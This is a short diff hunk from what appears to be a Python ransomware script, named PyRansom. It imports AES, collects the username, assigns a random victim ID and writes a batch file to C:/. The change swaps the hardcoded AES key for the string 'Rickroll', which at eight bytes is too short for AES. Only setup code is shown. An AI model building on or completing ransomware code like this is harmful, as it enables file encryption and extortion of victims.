@@ -6,7 +6,7 @@ import getpass
 import time
 from Crypto.Cipher import AES
 from tkinter import messagebox as me
-key = b'1145141919810pythonhnmpythonbest'
+key = b'Rickroll'
 ID = random.randint(100000,1000000)
 user = getpass.getuser()
 sDAHAdEAF = open(r'C:/PyRansom.bat','w')
